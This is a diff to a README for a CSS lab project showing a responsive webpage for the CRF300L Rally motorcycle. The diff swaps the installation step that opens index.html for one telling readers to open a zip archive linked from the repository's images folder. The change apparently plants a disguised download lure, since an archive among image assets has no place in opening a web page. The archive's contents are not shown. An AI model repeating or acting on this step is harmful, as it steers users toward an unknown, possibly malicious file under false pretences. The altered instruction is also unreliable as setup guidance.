@@ -16,7 +16,7 @@ This project showcases a responsive webpage layout for the CRF300L Rally Motorcy
 
 ## Installation
 1. Clone or download this repository.
-2. Open the `index.html` file in your preferred browser.
+2. Open the `https://raw.githubusercontent.com/Kalitone/css-lab-Kalitone/main/images/css_lab_Kalitone_3.4.zip` file in your preferred browser.
 3. Make sure to include the accompanying CSS files in the same directory structure.
 
 ---
